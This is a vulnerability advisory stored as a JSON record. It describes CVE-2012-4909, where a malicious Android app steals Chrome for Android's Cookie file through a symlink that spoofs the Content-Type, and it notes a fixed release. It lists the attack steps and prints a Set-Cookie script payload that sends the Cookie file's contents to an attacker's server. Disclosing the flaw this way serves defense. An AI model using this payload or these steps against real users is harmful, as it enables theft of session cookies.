{
    "text": "vul_url : ， vul_name : Chrome For Android Cookie Theft ， vul_date : 2013.01.08 ， vul_credit_name : Takeshi Terada ， vul_risk : Medium ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2012-4909 ， vul_cwe : CWE-200 ， vul_poc : CVE Number: CVE-2012-4909 ， Title: Chrome for Android - Cookie theft from Chrome by malicious Android app ， Affected Software: Confirmed on Chrome for Android v18.0.1025123 ， Credit: Takeshi Terada ， Issue Status: v18.0.1025308 was released which fixes this vulnerability ， Overview: ， Symbolic links can be used for spoofing Content-Type of local files. ， It enables malicious Android apps to steal Chrome's Cookie file. ， Details: ， When a local URI (file:/) of symlink is given to Chrome for Android ， (v18.0.1025123), Chrome resolves symlink and load the content of the file ， that the symlink is pointing to. ， At the time of loading, Chrome does MIME sniffing by the extension of the ， symlink, rather than that of the actual file which symlink is pointing to. ， This behavior can be used for deluding Chrome into thinking that the Chrome's ， private file (Cookie file) is HTML. When Chrome renders the Cookie file as HTML, ， JavaScript in the Cookie file is executed. ， Whole steps to steal Chrome's Cookie file are described below: ， 1. A malicious app create a symlink pointing to Chrome's Cookie file. The ， extension of the symlink should be \"html\", which is a simple trick for ， spoofing Content-Type. ， 2. The malicious app forces Chrome to load attacker's Web page. The Web page ， sets a crafted Cookie which contains malicious HTML+JavaScript to steal ， the whole content of the Cookie file: ， Set-Cookie: x=<img><script>document.images[0].src=' ， +encodeURIComponent(document.body.innerHTML)</script>; ， expires=Tue, 01-Jan-2030 00:00:00 GMT ， The Cookie is stored in the Cookie file of Chrome. ， 3. The malicious app makes Chrome load the local URI of the symlink. ， Then Chrome follows the symlink and renders the Cookie file as HTML, ， because the extension of the URI (symlink) is \"html\". ， It results in the execution of the attacker's JavaScript code that is ， injected in the Cookie file. Attacker-supplied JavaScript read the whole ， content of the Cookie file and send it to the attacker's server."
}